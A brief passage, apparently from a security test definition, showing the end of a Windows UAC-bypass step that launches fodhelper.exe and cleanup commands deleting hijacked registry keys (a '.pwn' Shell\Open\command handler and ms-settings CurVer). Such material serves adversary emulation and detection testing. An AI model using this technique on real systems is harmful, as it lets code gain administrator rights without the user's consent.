          escalation...; start fodhelper.exe
        cleanup: reg delete "HKEY_CURRENT_USER\Software\Classes\.pwn\Shell\Open\command"
          /ve /f; reg delete "HKEY_CURRENT_USER\Software\Classes\ms-settings\CurVer"
          /ve /f
